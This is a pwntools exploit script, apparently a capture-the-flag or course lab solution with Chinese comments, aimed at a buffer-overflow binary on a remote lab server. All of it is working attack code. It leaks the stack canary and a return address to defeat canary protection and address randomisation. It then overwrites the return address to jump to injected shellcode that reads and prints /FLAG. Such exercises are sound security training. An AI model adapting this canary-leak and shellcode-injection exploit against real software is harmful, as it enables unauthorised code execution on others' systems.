#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# 連接到服務器
r = remote('up.zoolab.org', 12343)
#r = process('./bof2')

# 生成 shellcode
shellcode = asm(
    shellcraft.pushstr('/FLAG') +
    shellcraft.open('rsp', 0) +
    shellcraft.read('rax', 'rsp', 100) +
    shellcraft.write(1, 'rsp', 'rax') +
    shellcraft.exit(0)
)

# 洩漏 canary 和返回地址
r.recvuntil(b"What's your name? ")
payload = b'A' * 8 * 17 + b'A' # 覆蓋 buf1, buf2, buf3
r.send(payload)
r.recvuntil(b"Welcome, " + b'A' * 8 * 17)
leaked_data = r.recvline(keepends=False)
log.info(f"Raw leaked data: {leaked_data.hex()}")
canary = u64(leaked_data[:8].ljust(8, b'\x00'))
log.info(f"Leaked canary: {hex(canary)}")
canary &= 0xffffffffffffff00
log.info(f"Leaked canary: {hex(canary)}")


# 輸入 buf2
r.recvuntil(b"What's the room number? ")
payload = b'B' * 8 * 13  # 覆蓋buf2, buf3
r.send(payload)
r.recvuntil(b"The room number is: " + payload)
leak = r.recvline(keepends=False)[:8]
leak = leak.ljust(8, b'\x00')  # 補齊 8 字節
ret_addr = u64(leak)
log.info(f"Leaked return address: {hex(ret_addr)}")

# 計算基址和 msg 地址
main_ret_offset = 0x9CBC  # 需根據二進制調整
base_addr = ret_addr - main_ret_offset
log.info(f"Base address: {hex(base_addr)}")
msg_offset = 0xef220  # 需根據二進制調整
msg_addr = base_addr + msg_offset
log.info(f"msg address: {hex(msg_addr)}")


# 輸入 buf3（溢出返回地址）
r.recvuntil(b"What's the customer's name? ")
payload =  b'A' * 8 * 5 + p64(canary) + b'A' * 8 + p64(msg_addr) 
r.send(payload)

# 輸入 msg（發送 shellcode）
r.recvuntil(b"Leave your message: ")
r.send(shellcode)

# 進入交互模式，接收 FLAG
r.interactive()